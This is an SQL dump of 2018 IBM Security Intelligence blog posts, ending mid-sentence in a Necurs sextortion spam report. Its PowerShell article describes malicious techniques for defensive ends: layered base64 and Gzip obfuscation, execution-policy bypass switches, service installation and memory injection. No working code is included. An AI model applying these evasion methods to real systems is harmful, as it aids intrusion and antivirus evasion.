INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'How Dimitry Snezhkov Balances the Yin and Yang of Penetration Testing', 'Security Intelligence Staff', '2018-11-1', 'Would you believe that one of the IBM X-Force Red team’s “celebrity hackers” had never physically touched a computer until he was 18 years old?\n Dimitry Snezhkov grew up in Ukraine in the 1990s, and his early education didn’t include access to real computers. His “informatics” class consisted of the teacher drawing a keyboard on a whiteboard and showing the class various commands. When they were ready, they graduated to the lab where the teacher would let students watch as he used a single computer.\n When Dimitry moved to the U.S. almost 20 years ago and took an English as a second language class at community college, he experienced a major culture shock. Upon handing in his first essay, his teacher rebuked the “handwritten note,” telling him to go to the lab and type it out. Dimitry had to give himself a crash course not only in Microsoft Word, but also in the basics of typing, deleting, saving and more — things we in the U.S. take for granted having grown up around technology.\n “I chuckle because I have to teach my grandma the same thing now,” he said.\n Today Dimitry believes that learning a system incrementally can feed your curiosity. After teaching himself the fundamentals, he started to think about how the computer itself operated, how to get online, how to chat with people and more.\n “Sometimes you want to have more functionality out of that system, so you start tinkering to see how you get there,” he explained. “And this is what you face with security: restrictions, access control, things that prevent you from accomplishing your goal. This is where the true sense of security starts coming out and you’re actually tinkering with things and getting answers. We see a limitation and start lifting those limitations to try to learn more about them.”\n \n Dimitry takes this same approach to testing customer security as part of the   offensive security services team. With his teammates, he is responsible for everything from initial scoping all the way to client-facing delivery of the test and resulting documentation. He enjoys bridging the gap between his customers’ limited understanding of security and what the testing entails.\n “I think over the years,   has become a little bit more mainstream,” he says. “Before it was maybe more esoteric, only employed by companies who had a lot to lose. Also, the attacker would usually have direct monetization interests in penetrating and compromising systems.”\n Today, though, as companies move more and more to digital systems, they must protect intellectual property, customer data and more from an increasingly automated onslaught of attacks. Dimitry believes that anything his team can do to illuminate the path of least resistance to a compromise can help customers hone in on their vulnerabilities — especially when they may be dealing with   they’ve forgotten about or processes that have become second nature to those in-house.\n “I think learning on your feet is a big deal,” he said. “When we’re faced with an unknown system, we don’t have any knowledge as to what production mechanism it has, who’s watching our steps, what the context may be. We use tools in our team as a litmus test on how applications or networks — or even humans, as we do a fair bit of social engineering in our testing — how those entities that we operate with respond when you probe. We probe and we get a response and we move further.”\n Dimitry spends his time probing systems to figure out how they are put together, then prodding further to see what’s wrong with them. But even with an   — on both the offensive and defensive sides — he stressed that you still need to have an analyst watching and collaborating.\n “Automation is something that has to be natural to a team like ours because there’s just no way we can test everything manually from the start,” he said. “We need to cast a wide net to be able to probe where the vulnerabilities are, because in today’s day and age, if you are testing a system and you have come up with a way to compromise that system, it’s almost guaranteed that somebody else on the other side of the world has already done that or is working toward doing the same thing.”\n The automation helps testers keep up with attackers and put up defenses more quickly and effectively. It’s a delicate dance — a balance of push and shove, thrust and parry. Even knowing that, you may not have guessed that this logically minded, technology-driven tester is also a partner in a holistic medicine school.\n “I have to balance things, and I do think that the idea of yin and yang is very powerful,” he said. “You have to be able to balance and draw on different sides of experiences in life.”\n Dimitry uses meditation to help him see the bigger picture, reflect and remain calm in a very demanding role where he’s constantly thinking on his feet.\n “I would like people to be open to an alternative mindset,” he said, “be open to looking under the hood, be open to collaboration and be open to full-scope testing.”\n To Dimitry, a little mindfulness can go a long way toward helping security professionals and   like himself stay focused on the most pressing threats and think creatively to stay one step ahead of ever-evolving attackers.', '\'Artificial Intelligence (AI)\', \'Automation\', \'Machine Learning\', \'Penetration Testing\', \'Security Testing\', \'Vulnerabilities\', \'Vulnerability Management\', \'X-Force\'', 'https://securityintelligence.com/how-dimitry-snezhkov-balances-the-yin-and-yang-of-penetration-testing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'IBM Security Named a Leader in IDC Incident Response MarketScape Report', 'Wangui McKelvey', '2018-10-22', 'This year, IDC recognized IBM X-Force Incident Response and Intelligence Services (IRIS) as a leader in its “ .” The IDC report cited how X-Force IRIS effectively streamlines incident response (IR) for customers around the globe by supporting analysts and responders with expert threat intelligence.  is laser-focused on reducing the time it takes to detect malicious activities, respond to attacks and, ultimately,  . Having the ability to quickly identify and respond to threats makes it harder for attackers to be successful. “Recognition as a leader in the 2018 IDC MarketScape report exemplifies the ability of our X-Force IRIS team in helping clients transform their incident response strategy,” stated Wendi Whitmore, global lead for IBM X-Force IRIS. “We thank our clients for their trust in partnering with X-Force IRIS. We will continue to invest in our people, processes and advanced technology to hunt threats and combat adversaries to help our clients succeed.” The report highlighted IBM Security’s focus on   among responders who are trained on triage and evidence collection. It also emphasizes the alignment of X-Force IRIS to partner across our IBM Security ecosystem, bridging the gap between security operations and IR and allowing security teams to escalate incidents and quickly develop a response plan. The X-Force IRIS team has a foundation built on threat expertise using collaborative tools and resources such as   to better predict and respond to threats. These investments have deepened our capabilities in responding and managing incidents and provide clients with comprehensive security services. X-Force IRIS continues to be a game changer in incident response and cyberthreat intelligence. Our security experts have been the first line of defense on some of the most publicized breaches throughout the world. With a deep understanding of adversaries and their evolving tactics, we combine incident response, intelligence and remediation to help clients recover faster and focus on what really matters: growing their business despite the challenges of cyber uncertainty.', '\'Data Breach\', \'IBM X-Force Exchange\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Incident Response Plan\', \'Threat Detection\', \'Threat Intelligence\', \'Threat Prevention\', \'Threat Response\', \'X-Force\'', 'https://securityintelligence.com/ibm-security-named-a-leader-in-idc-incident-response-marketscape-report/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'Why You Should Practice and Drill to Prepare for a Cyber Emergency', 'Claire Zaboeva', '2018-10-17', 'Nowadays, businesses operate in a ubiquitous computing environment, relying on information technology to enable the speed and agility of modern business practices from payroll to public offerings. With the vast amount of email content and links that are populating employee inboxes, just one click on a phishing scam can cause a cyber emergency that results in the loss of millions of dollars and customer loyalty — not to mention a lengthy remediation process that amasses additional costs over time. According to the Ponemon Institute’s “ ,” the average cost of a data breach globally is around $3.86 million. The cost of a mega breach — an event that involves the loss of 1 million to 50 million records — is between $40 million and $350 million, depending on the number of compromised records. Of the security events recorded in the study, 48 percent were caused by malicious or criminal attacks, including the use of phishing and social engineering techniques to gain unauthorized access to corporate networks. Inboxes are slammed with spam every day of the week, increasing the odds of successful compromise. The IBM X-Force Kassel research team operates a network of globally distributed spam honeypots, which collect billions of unsolicited email items. Last year, the research team pulled a sample of   to gain insight into when attackers’ spam bots were the most active. A look at the same sample size from 2018 echoes last year’s findings: Spammers never rest. However, they are primarily active on Tuesdays and Wednesdays, clocking in at 21 percent and 22 percent, respectively. In addition, they tend to take a less aggressive stance on Saturday (4 percent) and Sunday (9 percent), when offices are less populated and therefore not as target-rich of an environment. \n Any coach or instructor will tell you that you get what you train for. In the heat of the moment, our practiced reactions determine the speed and course of our actions. To provide better online security throughout the organization, user vigilance must be a practiced part of the daily workflow. The   outlined five key components for designing an effective fire safety education program. In cybersecurity, we can apply that same approach to train personnel to consistently avoid the flames of phishing and react effectively to inadvertent compromise. Begin by gathering information about your workforce and network security posture to identify where risks and vulnerabilities may exist. If you’re going to build a safe and consistent security environment, governance is key. Employees must understand what the organization deems right or wrong. Likewise, network defenders should be well-versed in existing policies and procedures for addressing cyber emergencies. Using examples of previously successful breaching techniques — such as mimicking the phishing scams that already made it through the organization’s safety net — can help you determine how familiar employees are with the dangers of current-day deception and   scams. Meet with IT managers to learn what procedures are in place to help protect against exposure and minimize risk. This is also a great time to ask network defenders about secure email gateways, orchestration and automation, password protection, and two-factor authentication (2FA). Finally, whether hosted locally or in the cloud, a best practice for email security is to take a  . Digital fortification — from the network perimeter down to individual device hardening — that is built into corporate IT planning can help reduce exposure and risk. Every emergency action plan needs to identify key internal and external stakeholders. Who should respond and who needs to be notified if a malicious link is accessed and the network is set ablaze? Speed and calmness are everything in this moment. Companies that have an in-house   or an on-call service to confirm and respond to a breach stand to substantially reduce losses in the event of a compromise. According to the “2018 Cost of a Data Breach Study,” companies with a low mean time to identify (MTTI) a breach — less than 100 days — saved more than $1 million. Likewise, companies with a low mean time to contain (MTTC) a breach — less than 30 days — saved more than $1 million compared to those that took longer than 30 days.  should clearly outline who to contact in different departments and ranks — in network security, the C-suite and the IR team component, but also the PR team and the company’s legal counsels. The plan should make it easy to reach them, know their responsibilities and have a clear view of their resources for carrying out mission-critical functions in the event of a cyber emergency. Once you have analyzed your risk environment and identified stakeholders, it’s time to establish objectives and create a plan of action. In case of suspected activity, employees should be able to  , whether via email or on the phone, and react appropriately as part of their everyday workflow. To do this, you need to recognize, react and repeat. \n Establish what “normal” looks like to help personnel readily identify what key indicators should not be trusted. For example: \n Identify the next steps that personnel should take when something alarming appears. Is the organization set up to enable quick and effective reporting of suspicious emails and activity? Ensure that any employee can easily report an issue to IT security and the IR team. If a user identifies something malicious, a referenceable policy should be in place that clearly states where to forward it and how to flag it. Statistics should then be captured from these events and used to help establish trending threats. If an employee has already clicked a link, identify what needs to happen next to correct the situation, from pulling the plug to quarantining the network. If a larger issue is confirmed or an attack is underway, each corporate player should know his or her role. Decisive action can save priceless moments when reacting to a digital threat. \n Drills should happen monthly, quarterly and double during the holiday season. After all, what’s more enticing than a gift card during the shopping season? Security-savvy reactions aren’t built in a day; they become a part of the culture, a practiced reaction to inbox items that look and smell “phishy.” Gone are the days when droning through a stale slide deck will satisfy a training requirement. People learn in a variety of ways; if you want employees to remember and adhere to your plan, it needs to be engaging. Those in charge of   would be wise to reach, frame and connect their content with the target audience, a practice known as role-based training, to fit each role’s specific risk factors and likely attack scenarios. Training needs to be memorable and interactive, so don’t skimp on quizzes, visual reminders, mock phishing campaigns and even companywide giveaways. There’s nothing like a security reminder on a new thermal cup. A spoonful of sugar is a small price to pay to boost organizationwide security awareness. An unexamined plan isn’t worth practicing. Training must be systematic to yield results. Simulate relevant attack scenarios that may affect the organization as authentically as possible and collect the stats on response times and accuracy. Do it again in a quarter, in a month or at random. Crunch the numbers and compare the results. Are employee responses improving? If not, how can the program be improved? Remember to systematically return to the first step in this approach: assess your environment. In addition to internal review, an outside set of professional eyes on your network to perform periodic   can help expose previously undiscovered vulnerabilities. Criminal phishing methodologies and the ways by which they target employees are evolving every day, and a good IR plan should too. The need to establish a   has become an accepted tenet of digital enterprise security. To help online safety become second nature across the organization, employees must be able to recognize the sparks of all kinds of scams and learn to react appropriately. Employers, in turn, must give their users the resources they need to continuously adapt to evolving threats and act as a protective layer that can help avoid losses from a cyber emergency.', '\'Data Breach\', \'Data Protection\', \'Education\', \'Incident Response (IR)\', \'Incident Response Plan\', \'National Cyber Security Awareness Month (NCSAM)\', \'Phishing\', \'Phishing Attacks\', \'Phishing Emails\', \'Security Awareness\', \'Security Training\', \'Social Engineering\', \'Spam\', \'User Education\'', 'https://securityintelligence.com/why-you-should-practice-and-drill-to-prepare-for-a-cyber-emergency/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, '3 Lessons That Are Informing the Next Generation of the Cyber Range', 'Caleb Barlow', '2018-10-15', 'At the X-Force Command Cyber Range in Cambridge, Massachusetts, we’ve seen hundreds of companies practice their response to a simulated cybersecurity attack. Teams from some of the world’s top intelligence and law enforcement agencies and financial institutions, and from a variety of industries from energy to technology, have trained in various scenarios in our range, which is modeled after a fusion team  . These are all highly competent people, but many of them struggle in our breach challenges. When we opened the Cyber Range, we knew our experts would be training security professionals in technical skills with hands-on-keyboard exercises. What we didn’t anticipate was the massive demand for the type of training we offer for those outside of the SOC. That’s why we strive to teach business leaders how the whole organization should respond to an event that affects every level of the business. What we’ve learned from watching these teams of executives, board members and other leaders is that people need the most help when dealing with what comes after a breach — what we call “ .” Many leaders come out of business school having studied a decision-making process that is slow, deliberate and based on mountains of data. But you don’t have that luxury after a breach — you are working against a ticking clock and with incomplete information. You have to learn a more military-style decision-making process, where you stand up an incident command team, designate a commander who is in charge, start walking down a runbook that’s been predetermined, and make hard decisions without hesitation. Classroom-style learning, tabletop exercises and even talking to security leaders who’ve been through the experience of a breach aren’t enough to prepare you for the intensity of a rapidly changing situation where the survival of your business is on the line. You need to experience it yourself. That’s where the X-Force Command experience is different from other kinds of preparation, and even the other cyber ranges out there. Our technical advisors and   have mastered the art and science of creating an experience that feels like a real breach. When the phones start ringing and you’re forced to react when the action is coming at you fast, there is a palpable sense of pressure. Going through this experience shows people what they’re made of, helps them learn how to respond in a stressful situation, and highlights where they need to improve their decision-making capacity. In the past couple of years, my team has learned a lot, too, about how to build the X-Force Command experience into a laboratory of cyber best practices. With more than 2,000 customers that have come through the range, we can share what some of the world’s most mature customers are doing to stay one step ahead of threats. We help teams conduct a gap analysis based on business key performance indicators (KPIs), and we teach you what a full business response looks like, both before and after an incident. Below are three common themes we’ve noticed that tend to have a big impact on whether teams are successful in the range. Your   makes a big difference in how well you perform in a crisis. Some cultures are more inclined to run toward a problem, and those that do tend to fare better. It takes a cohesive unit and a common understanding in which people know their roles, but aren’t afraid to speak up or take charge when the time is right. Having a playbook is just the beginning. In the heat of the moment, there’s no time to fumble through the playbook and figure out what to do next. That’s when your training and muscle memory kicks in and you execute your plan. If you don’t practice it, you are exposed to an avoidable disadvantage. Last but not least, you need leaders. Sometimes those leaders are not your executives. More often it’s someone who has done a tour in Iraq or Afghanistan or has spent time as an EMT. Some kinds of leadership can be taught in a classroom, but the true test of leadership happens in the arena.  , and every tough situation needs leaders. If you’re like many organizations struggling to find qualified talent to fill empty cybersecurity chairs, you might need to look beyond the traditional places. Recruit and train leaders. There has been such tremendous demand to visit our X-Force Command Cyber Range that we decided pretty early on that we would need to expand our operations. But rather than trying to choose a location for customers to come to us, we want to bring the X-Force Command experience to you. This week, we reached the culmination of a months-long project to do just that, and I’m so excited to launch our new  . \n The X-Force Command C-TOC is a mobile command center, modeled after the tactical operation centers used by the military and first responders, but with a singular focus on cybersecurity. It’s the industry’s first mobile cyber range and watch floor — and it’s a technical wonder. To fit all the equipment necessary for an X-Force Command experience, the 23-ton trailer expands to more than twice its width. The whole thing is powered by a 47 kilowatt generator, allowing us to create an entire IT environment on a 100 TB VMware solid-state disk array. It’s easy to be impressed by the C-TOC’s size and appearance — like something straight out of a “Transformers” movie — but form really follows function. Building on the mission of the Cyber Range, the primary goal of the C-TOC is to give more customers access to the cutting-edge simulations and response training we’ve developed from our experiences in Cambridge. However, the mobility of the C-TOC opens up many additional possibilities, such as education with students and the public, and even helping with cybersecurity efforts on-site at major events. Check out the   to learn more about why we built it and what it can do.', '\'Cybersecurity Training\', \'IBM X-Force Command Center\', \'Incident Response (IR)\', \'Penetration Testing\', \'Security Operations Center (SOC)\', \'X-Force\'', 'https://securityintelligence.com/3-lessons-that-are-informing-the-next-generation-of-the-cyber-range/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'An Increase in PowerShell Attacks: Observations From IBM X-Force IRIS', 'Camille Singleton', '2018-10-12', 'Do you remember the era before GPS navigation devices? When getting somewhere unfamiliar involved receiving and remembering verbal directions, or — in the higher-tech ’90s — printing out a list of directions and a map to take on the trip? The ease and convenience of GPS devices has made these older methods all but obsolete. For many, there is no going back. Such is the pathway of PowerShell, a Microsoft framework that is both a scripting language and a command line executor, useful for simplifying network administration and automating mundane tasks such as pushing updates to multiple devices. PowerShell first appeared in 2006 and has been a standard feature of the Windows operating system (OS) since Windows 7. Moreover, PowerShell 6.0 was released under the Massachusetts Institute of Technology (MIT) open source license in 2016 in an effort to encourage cross-platform adoption and increase usage. PowerShell is a versatile tool that can execute code from memory and provide entry directly to a device’s core. That includes unbounded access to Windows application programming interfaces (APIs), full access to the Windows Management Instrumentation (WMI) and access to the .NET Framework. Despite its multiple benefits, PowerShell — like GPS systems — can be used by threat actors. IBM X-Force Incident Response and Intelligence Services (IRIS) identified an upward trend in malicious PowerShell use — most likely due to the open-source nature of the tool, and because malicious actors have realized they can use the tool to inject malware directly into memory, enhance obfuscation and evade antivirus detection software. Our observations provide additional insight to this evolving trend, and highlight unique aspects of PowerShell use by threat actors, such as PowerShell scripts installed as services. Multiple security analysts have noted a significant increase in malicious PowerShell use after PowerShell 6.0 became open source in 2016. A   report found that PowerShell malware increased by 432 percent between 2016 and 2017, and   noted a 661 percent increase in the number of computers where PowerShell activity was blocked from mid-2017 to mid-2018. IBM X-Force data similarly revealed that PowerShell attacks have been growing over the past 12 months. Furthermore, data from our   identified a distinct increase in the use of malicious PowerShell in April, August and September 2018 (Figure 1). \n \n While our data indicated that obfuscated attacks trailed off in May and June 2018, they reappeared in late July 2018. In mid-September, we began to see a new attack type appear in our data: suspicious PowerShell downloader activity indicating that a remote attacker was attempting to use PowerShell to download malicious content and automatically trigger execution of the payload. This could allow malicious code to run and infect the target system. The appeal of the PowerShell framework to an attacker is clear: execution directly from memory means that attacks can remain fileless and are thus stealthier than other types of attacks. PowerShell also provides remote access capabilities and can bypass application whitelisting. Moreover, threat actors can use PowerShell encoding options to enhance the obfuscation of malicious code, lending more stealth to illicit operations. Yet just as shutting down the entire GPS satellite network would have more negative repercussions for legitimate users than would be worthwhile — and criminals would probably find a workaround anyway — the elimination of PowerShell would provide little resolution to the underlying problem of malicious cyber actors. Instead, security practitioners would do well to stay updated on how bad actors can use PowerShell and familiarize themselves with the tools available to detect and eradicate malevolent activities. To that end, let’s take a look at some of the trends in malicious PowerShell use observed by X-Force IRIS — leading with the most unique — and explore some tips to help defenders detect and mitigate PowerShell attacks. One of the more unique tactics we have observed in recent attacks on organizational networks is threat actors installing PowerShell scripts as services. Windows services are programs that run in the background and do not require frequent user interaction. As such, malicious actors can leverage these types of programs to install and run other programs while evading detection under the guise of a legitimate part of the operating system. In most of the instances in which X-Force IRIS observed PowerShell scripts installed as services, the script contained a base64-encoded string. The string decodes to a Gzip-compressed PowerShell script, which is then launched. In the example below, the PowerShell script is run as a service and requires Non-Sucking Service Manager (NSSM) to operate. That component was initially installed as part of the malware payload. Once installed, the PowerShell script calls NSSM and launches the malicious service. \n Installing PowerShell scripts as services is not a common theme in security blogs and reports, suggesting this is a new or unique trend. Before exploiting PowerShell on a device, threat actors must first gain access to the device of interest. One common method that X-Force IRIS has observed is the use of phishing emails with productivity file attachments that contain malicious macros. Once activated, the malicious macros launch PowerShell, which then executes commands or scripts in the background and ultimately fetches and installs malicious code or malware. In some other cases, we have observed the use of   attachments in phishing attacks to initiate PowerShell and run malicious scripts. According to   from anti-phishing organizations, phishing attacks continue to have a high rate of success. Subtle social engineering techniques, combined with well-researched messages and attachments that closely mimic those coming from legitimate organizations, continue to prove effective in deceiving even the most security-savvy recipients. Unsurprisingly, phishing emails remain the infection vector of choice for many skilled and unskilled attackers seeking to use PowerShell for malicious purposes. Microsoft Word and Excel macros are likewise popular choices for malicious PowerShell use since they are routinely accepted as email attachments by many organizations. Activating code via macros on these file types can be stealthy, and this provides an avenue for dropping scripts that can evade various detection mechanisms. X-Force IRIS regularly observes attackers using productivity file attachments purporting to be billing invoices, delivery notices or resumes to lure victims into opening them and enabling macros, which can end up infecting hosts and granting an attacker a foothold in the organization. Threat actors often inject malware directly into memory using PowerShell, a tactic that IRIS has observed on multiple occasions. Using PowerShell as an injection method for malicious code or malware can eliminate intermediate steps and increase the malware’s stealth and agility. Injecting malware directly into memory is one method that PowerShell users employ to bypass antivirus systems. As most antivirus software systems search for bad files written to disk, malicious actors may be able to evade malware scans by injecting directly into a computer’s random-access memory (RAM). The destination process for the PowerShell injection varies depending on the attacker’s intention and skill. In many cases, attackers use PowerShell to inject malware into active, legitimate Windows processes, such as explorer.exe. To facilitate this process, threat actors occasionally drop their PowerShell scripts into temporary folders on the system. Once deployed, the malware injected directly into memory will have capabilities similar, if not identical, to malware written to disk: keylogging, data exfiltration and credential capture are just some of the operations that can then be commanded by a remote attacker. In  , the malware was capable of checking the environment before deployment to ensure it was not being run in a sandbox. It also scanned the network configuration for specific targets of interest, seeking out strings such as point-of-sale machines, healthcare-related words and access to financial websites, to name a few. Before digging into this next trend, please note that base64-encoded PowerShell is not an inherently malicious choice; it can be used for legitimate purposes, such as transferring binary files. However, encoding can be particularly helpful to an attacker because it allows obfuscation of the contents of malware that attackers may choose to deploy, thereby evading some malware detection mechanisms. To begin, the presence of base64-encoded PowerShell scripts is often a telltale sign that malicious actors are using the framework. Legitimate users do not typically encode their scripts, but adversarial actors will often use encoding to obfuscate executable code that would otherwise get flagged by endpoint detection solutions. For the past few months, X-Force IRIS has observed an increase in nested obfuscation when PowerShell is used maliciously. We have seen threat actors employ not only Base64-encoded scripts and commands, but also layers of obfuscation, sometimes including base64 encoding inside base64 encoding (double encoding) and then using Gzip compression, which adds an additional requirement to deflate. Other instances showed base64 encoding using a nonstandard alphabet to further obfuscate the script. These techniques make decoding harder for outsiders and raise a flag for defenders to further examine their intent. In the following example, we provide information on a malicious Microsoft Excel document that contained Base64 obfuscation in order to evade detection, and how it was able to launch PowerShell to further its sinister endeavors. \n This is an Excel document containing multiple malicious Visual Basic for Applications (VBA) macros that provide instructions encoded in Base64. The delivery mechanism is a phishing email. The file is opened in Microsoft Excel by the victim, and the program executes the malicious macros (some strings are purposely truncated). \n Embedded macros execute PowerShell — let’s look at the script’s elements: Base64-encoded command hidden in the Excel macro: \n The -Exec Bypass switch allows PowerShell to run with elevated privileges to bypass the execution policy. The -NoL (NoLogo) switch hides the PowerShell copyright banner at startup. The -Enc (Encoded Command) switch tells PowerShell to expect base64-encoded parameters for execution. These instructions cause the victim’s machine to download a malicious PowerShell script over an HTTP connection, which could then be executed as shown in the example below. The decoded strings: \n Fortunately, PowerShell use will not assist a malicious actor in all stages of an attack. Rather, it is primarily used to enable actions an attacker takes after initial compromise. Threat actors still need to use alternative tools for other stages of the attack, such as external reconnaissance, developing infrastructure, initial compromise and, often, to establish a foothold in the environment. The recently launched “ ” detail the steps most attackers take in identifying, researching, targeting and attacking a victim network. \n \n Of the steps outlined above, X-Force IRIS has observed PowerShell used primarily to move laterally, establish a foothold, conduct reconnaissance and maintain persistence in attacks. PowerShell provides many opportunities for lateral movement within a target environment. In addition, using its scripts maliciously can allow attackers to establish a foothold by installing backdoors and to maintain persistence by placing malware in scheduled tasks, or in fileless fashion, directly into memory. To that effect, X-Force IRIS recently observed that   email messages often provided the initial infection vector for attackers. Traditional protection methods, such as physical security controls, anti-phishing software solutions, disabling macros and using banners to highlight messages coming from outside the company can assist in decreasing opportunities for attackers who rely on PowerShell to gain access to a networked device.   about the risks of opening file attachments and enabling macros in unsolicited emails can add another layer of security to reduce the chances of infection at the source. With the accelerating use of PowerShell scripts, nested obfuscation and mechanisms to bypass application whitelisting, what can be done to mitigate risks? To keep enjoying the benefits of PowerShell and help lessen the risk of misuse, IRIS recommends logging, tracking and auditing PowerShell use in your networks and employing specific search tools to flag malicious behavior. Below are some specific tips for logging and tracking potentially malicious PowerShell activity: Specialized software and preventive measures can help provide an additional layer of protection and eliminate some of the manual process involved in logging PowerShell use and identifying potentially malicious scripts. These include: Finally, in cases where attackers have already caused damage to a system or have facilitated the theft of information,   can assist in detecting malicious PowerShell scripts and eradicating them from an organization’s infrastructure. To restore security levels, it is important to detect and eliminate any malware or malicious processes that were injected using the PowerShell framework. By increasing employee awareness and calibrating security controls to detect malicious PowerShell activity, organizations can enjoy better protection against threats and the evolving nature of threat actors active in the wild.', '\'Endpoint Security\', \'Forensics\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Malicious Code\', \'Malware\', \'Malware Injection\', \'Security Information and Event Management (SIEM)\', \'Windows\', \'X-Force\'', 'https://securityintelligence.com/an-increase-in-powershell-attacks-observations-from-ibm-x-force-iris/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'Visit the Subway System of Cybercrime With Security Consultant Francisco Galian', 'Security Intelligence Staff', '2018-10-12', 'It took a group of Spain’s best hackers to awaken Francisco Galian’s passion for cybersecurity.\n Francisco was in his last year of university in his native Barcelona, and as he was looking for a topic for his final thesis project an unforeseen opportunity presented itself: A security startup based on campus was developing a new threat intelligence platform. Though Francisco — then studying telecommunications engineering — didn’t intend to enter the security field at the time, he thought it could be a good learning opportunity.\n “To me, it was incredible seeing what the hackers were doing, learning from them,” he says. “I just totally loved it. I was learning a lot and hearing all these battle stories.”\n Those “battle stories” must have been inspiring, because Francisco dove headfirst into security. He worked in cyberthreat intelligence before moving in-house, combining his telecommunications degree and newfound love of security by working with the likes of Cellnex and O2 Telefonica as the security lead.\n Those days, he says, were “massively different” from his current work as a security consultant at   EMEA. Working for just one company requires an intimate understanding of its infrastructure, and it adds the complications of navigating the internal politics that can make life tough for security teams. It can also lead internal teams to become complacent, Francisco believes.\n “If you’re a company, you should be receiving attacks every single day just because you have public assets,” he says. “That doesn’t mean that these are very naughty attacks and everything is wrong, no. You just have to see them because you are exposed to the internet.”\n Nowadays, Francisco worries when he hears that a customer hasn’t had an attack in a while. He remembers his own days in-house and knows it’s just when you think you’re safest that attacks hit you hardest. Too often he’s spoken with customers who think they’re fine, only to have the   tell them they’ve been fully compromised for months.\n He explains it with an analogy. Let’s say you work in a bank in a city with an underground transport network. Now, you walk along the streets and you walk into your office, and you don’t think about the network operating underneath you; it’s invisible to those above ground. But underneath the streets, the bad guys are moving all the money out of your bank accounts.\n “The thing is, you were blind — you were not looking for it, both in processes and infrastructure,” Francisco says. “That’s the big reality. People working just in one company, sometimes they struggle to understand that.”\n Francisco now spends his days on-call to be parachuted in when times are tough for IBM clients. He jokes that Friday at 5 p.m. is the busiest time, as the weekend looms and internal teams haven’t been able to crack the problem.\n Francisco uses his vast knowledge of cybersecurity to help with incident response, to find the issues and to help rectify and protect. He talks about one banking client that found its website defaced by threat actors; he needed to investigate the incident to determine whether it was a compromise in their infrastructure or the DNS provider’s. Remarkably, he had that one solved in three hours.\n \n The   has been in cryptojacking, wherein a system is compromised not to lock it with ransomware, but to use its computing resources to mine cryptocurrencies. The largest incident Francisco has worked on saw thousands of machines compromised within one company. That attacker was clever: They set a low threshold for the zombies, which meant the CPU wasn’t maxed out, making it harder to detect.\n “The thing is, if for whatever reason they get pissed off, they can just shut down a huge part of your network,” he laments. And he’s seen that — threat actors who get annoyed and start to play around, or worse.\n “Our day-to-day is just once a year for most companies,” Francisco says of the team focused on incident response and digital forensics. Customers come to the team when they have a severe incident they can’t handle internally. Every week it could be a new incident, a new threat, a new investigation — and when there are no new cases, the team is preparing customers via simulations and scenarios to help them be ready when the time comes.\n “My aim is always to push for the efficiency, to find clever ways of doing stuff, automating tasks,” Francisco says. “That’s what I learned from my sensei from my early days. He was crazy about that — he automated everything even when he was pen testing, attacking, defending, and I’ve embraced that fully.”\n And yet Francisco is not tech-obsessive. When he’s finished saving networks, you’ll find him outside playing sports — far from the computer’s glare. It’s a need to “disconnect,” he says; to have an escape. He jokes that he learned he had to have his “own life” after his first few years working in security.\n And he finds staying fresh makes a big difference when you’re in the midst of responding to a big incident. “I’ve learned this from bad experiences,” he says. “You just have to find your own ways of disconnecting, and to me, sport is one of the best. If you can go and be outside, it’s going to be always better.”\n That fresh mind is key when he’s in the midst of a situation and trying to work out his next move,   that inspired his career so many years ago. Laughs the Spaniard, “The answer is not always in the coffee!”', '\'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Threat Intelligence\', \'Voices of Security\', \'X-Force\'', 'https://securityintelligence.com/visit-the-subway-system-of-cybercrime-with-security-consultant-francisco-galian/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'The Many Faces of Necurs: How the Botnet Spewed Millions of Spam Emails for Cyber Extortion', 'Dirk Harz', '2018-10-10', 'The  , a large and well-known spam originator, has become synonymous with cybercrime. Its spam-sending capabilities, through a botnet of a few million infected devices, are frequently dedicated to vast campaigns that deliver banking malware, cryptojacking malware, ransomware and a variety of email scams sent to millions of recipients in each run. IBM X-Force monitors Necurs activity and recently discovered yet another face of this malspam volcano. This time, Necurs is spewing geotargeted emails designed to   from those who may have been watching adult movies or possibly having an extramarital affair. Of course, this spam campaign is yet another a wide-cast net from Necurs, and the attackers have no idea whether the person they reached actually does any of these activities, but the odds appear to pay off anyway. Like other phishing and social engineering scams, it is often a numbers game. In   that started around mid-September, X-Force detected millions of emails sent to recipients in different countries, essentially from the same set of malicious IPs and with similar content. The emails came from over 30,000 different IP addresses, 70 percent of which were dynamic IPs. The attackers demanded that victims pay in bitcoin to one of more than 500 unique wallets. The campaign came in typical spikes of activity that was more marked midweek and then over the weekend. \n All of Necurs’ cybercrime campaigns are linked with well-known cybercrime gangs, such as the operators of the  ,  , Locki and Monero miners, to name a few. But in this case, scammers don’t have much more than a creative email they send around and wait for the cash to come in. All they’re using here is social engineering. Email content examined by X-Force researchers revealed a number of repeating formats in which the sender falsely claimed to have malware-based control of the recipient’s email accounts and computer. The attackers went on to allege that they had infected adult sites with tracking malware and filmed the victim through his or her webcam while watching content on a supposedly compromised site. To keep the matter secret, the senders demanded that money be sent to them in bitcoin, asking for an amount between $250 to $550. If they were not paid, the attackers threatened to distribute the supposed video recording to the victim’s contact list, family, co-workers and friends. In another version of the scam, the attackers claim they have knowledge about an extramarital affair the recipient is engaged in and threaten to send supposed proof of the affair to the victim’s spouse, family, friends and co-workers. In all cases, the sender has no control of the recipient’s device or webcam, and the entire ploy is a sham. But to make the recipient believe otherwise, the spammers added a twist: the value of the “From” header field is equal to the “To” header field, which would seem to confirm that the blackmailer has access to the victim’s accounts/computer. Also, the “SMTP-From” and “SMTP-To” values are equal to the “From” value. \n This time, unlike previous campaigns, Necurs is spreading spam in different languages. To deliver the message in the correct language, emails are sent according to the recipient’s webmail top-level domain (TLD). So if the 